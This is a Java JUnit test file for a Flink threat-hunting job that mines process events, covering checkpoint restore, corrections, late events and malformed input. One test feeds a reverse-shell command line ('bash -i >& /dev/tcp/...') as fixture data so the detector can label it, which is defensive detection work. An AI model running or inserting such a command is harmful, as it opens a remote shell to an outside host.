package com.sls.hunter.flink;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.time.Instant;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import org.apache.flink.api.common.typeinfo.Types;
import org.apache.flink.api.java.functions.KeySelector;
import org.apache.flink.runtime.checkpoint.OperatorSubtaskState;
import org.apache.flink.streaming.api.operators.KeyedProcessOperator;
import org.apache.flink.streaming.api.operators.ProcessOperator;
import org.apache.flink.streaming.runtime.streamrecord.StreamRecord;
import org.apache.flink.streaming.util.KeyedOneInputStreamOperatorTestHarness;
import org.apache.flink.streaming.util.OneInputStreamOperatorTestHarness;
import org.junit.jupiter.api.Test;

class StreamingStateTest {
  static MiningConfig config() {
    Properties p = new Properties();
    p.setProperty("target.start.date", "2026-06-10");
    p.setProperty("fleet.mode", "exact");
    p.setProperty("baseline.days", "1");
    p.setProperty("min.count", "1");
    p.setProperty("emit.interval.ms", "10");
    p.setProperty("allowed.lateness.ms", "0");
    return new MiningConfig(p);
  }

  static KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness() throws Exception {
    return harness(config());
  }

  static KeyedOneInputStreamOperatorTestHarness<String, Event, String> harness(MiningConfig miningConfig)
      throws Exception {
    return new KeyedOneInputStreamOperatorTestHarness<String, Event, String>(
        new KeyedProcessOperator<String, Event, String>(new MiningProcessFunction(miningConfig)),
        new KeySelector<Event, String>() {
          @Override
          public String getKey(Event event) {
            return event.family;
          }
        },
        Types.STRING);
  }

  static MiningJob.SourcedRecord sourced(String value) {
    return new MiningJob.SourcedRecord("test-topic", 0, -1L, value);
  }

  static Event seal(String day) {
    return Event.parse(
        Json.write(Json.obj("kind", "SEAL", "index_family", "tracing_sas_linux", "day", day)));
  }

  static void send(KeyedOneInputStreamOperatorTestHarness<String, Event, String> h, Event e)
      throws Exception {
    h.processElement(new StreamRecord<Event>(e));
  }

  static Map<String, Object> last(KeyedOneInputStreamOperatorTestHarness<String, Event, String> h) {
    return Json.map(h.extractOutputValues().get(h.extractOutputValues().size() - 1));
  }

  @Test
  void readinessRestoreCorrectionAndIdempotence() throws Exception {
    OperatorSubtaskState snapshot;
    long now = Instant.parse("2026-06-11T00:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness()) {
      h.open();
      h.setProcessingTime(now);
      send(h, RulesTest.event("t", "tracing_sas_linux", "2026-06-10", "a", "echo", "echo hi"));
      h.setProcessingTime(now + 10);
      assertTrue(h.extractOutputValues().isEmpty());
      send(h, seal("2026-06-09"));
      h.setProcessingTime(now + 20);
      assertEquals("PROVISIONAL", last(h).get("status"));
      send(h, seal("2026-06-10"));
      h.setProcessingTime(now + 30);
      assertEquals("FINAL", last(h).get("status"));
      snapshot = h.snapshot(1, now + 30);
    }
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness()) {
      h.initializeState(snapshot);
      h.open();
      h.setProcessingTime(now + 40);
      send(h, RulesTest.event("t", "tracing_sas_linux", "2026-06-10", "a", "echo", "echo hi"));
      h.setProcessingTime(now + 50);
      assertTrue(h.extractOutputValues().isEmpty());
      send(h, RulesTest.event("base", "tracing_sas_linux", "2026-06-09", "a", "echo", "echo hi"));
      h.setProcessingTime(now + 60);
      assertEquals("CORRECTED", last(h).get("status"));
      assertFalse(((List<?>) last(h).get("deleted_signal_ids")).isEmpty());
      assertTrue(((Number) last(h).get("revision")).longValue() > 1);
    }
  }

  @Test
  @SuppressWarnings("unchecked")
  void rulesOnlyPublishesWithoutBaselineOrFleet() throws Exception {
    Properties properties = new Properties();
    properties.setProperty("target.start.date", "2026-06-10");
    properties.setProperty("fleet.mode", "legacy_snapshot");
    properties.setProperty("history.compare", "false");
    properties.setProperty("baseline.days", "5");
    properties.setProperty("min.count", "2");
    properties.setProperty("emit.interval.ms", "10");
    properties.setProperty("allowed.lateness.ms", "0");
    long now = Instant.parse("2026-06-11T00:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h =
        harness(new MiningConfig(properties))) {
      h.open();
      h.setProcessingTime(now);
      send(h, RulesTest.event("plain", "tracing_sas_linux", "2026-06-10", "10.0.0.2", "echo", "echo hi"));
      send(
          h,
          RulesTest.event(
              "shell",
              "tracing_sas_linux",
              "2026-06-10",
              "10.0.0.2",
              "bash",
              "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"));
      h.setProcessingTime(now + 10);
      Map<String, Object> snapshot = last(h);
      assertEquals("PROVISIONAL", snapshot.get("status"));
      assertTrue(((List<?>) snapshot.get("baseline_dates")).isEmpty());
      List<Map<String, Object>> signals = (List<Map<String, Object>>) snapshot.get("all_signals");
      assertTrue(signals.stream().noneMatch(signal -> "echo".equals(signal.get("proc_name"))));
      assertTrue(signals.stream().anyMatch(signal -> "reverse_shell".equals(signal.get("behavior_label"))));
      assertTrue(
          signals.stream()
              .noneMatch(
                  signal ->
                      J8.set("novel_host", "novel_triple", "history_diff", "novel_template")
                          .contains(String.valueOf(signal.get("signal_type")))));
    }
  }

  @Test
  void oldEventsGoToLateSideOutput() throws Exception {
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness()) {
      h.open();
      send(h, RulesTest.event("new", "tracing_sas_linux", "2026-07-10", "a", "echo", "echo hi"));
      send(h, RulesTest.event("old", "tracing_sas_linux", "2026-06-10", "a", "echo", "echo hi"));
      assertEquals(1, h.getSideOutput(MiningProcessFunction.LATE).size());
    }
  }

  @Test
  void bucketSerializationPreservesSampleMaps() throws Exception {
    DayBucket b = new DayBucket();
    b.add(RulesTest.event("a", "tracing_sas_linux", "2026-06-10", "a", "echo", "echo hi"));
    DayBucket restored = Json.MAPPER.readValue(Json.write(b), DayBucket.class);
    assertEquals(
        "echo hi", restored.triples.values().iterator().next().samples.get(0).s("cmdline"));
  }

  @Test
  void unflushedInputsSurviveCheckpoint() throws Exception {
    OperatorSubtaskState checkpoint;
    long now = Instant.parse("2026-06-11T00:00:00Z").toEpochMilli();
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness()) {
      h.open();
      h.setProcessingTime(now);
      send(h, seal("2026-06-09"));
      send(
          h, RulesTest.event("pending", "tracing_sas_linux", "2026-06-10", "a", "echo", "echo hi"));
      checkpoint = h.snapshot(9, now);
      assertTrue(h.extractOutputValues().isEmpty());
    }
    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness()) {
      h.initializeState(checkpoint);
      h.open();
      h.setProcessingTime(now + 10);
      assertEquals("PROVISIONAL", last(h).get("status"));
      assertFalse(((List<?>) last(h).get("all_signals")).isEmpty());
    }
  }

  @Test
  void malformedDateAndNullEnterDlq() throws Exception {
    try (OneInputStreamOperatorTestHarness<MiningJob.SourcedRecord, Event> h =
        new OneInputStreamOperatorTestHarness<MiningJob.SourcedRecord, Event>(
            new ProcessOperator<MiningJob.SourcedRecord, Event>(new MiningJob.Parse(300000)))) {
      h.open();
      h.processElement(new StreamRecord<MiningJob.SourcedRecord>(sourced("null")));
      h.processElement(
          new StreamRecord<MiningJob.SourcedRecord>(
              sourced(
                  Json.write(
                      Json.obj(
                          "index_family",
                          "tracing_sas_linux",
                          "event_id",
                          "x",
                          "payload",
                          Json.obj("@timestamp", "broken"))))));
      assertEquals(2, h.getSideOutput(MiningJob.DLQ).size());
    }
  }
}
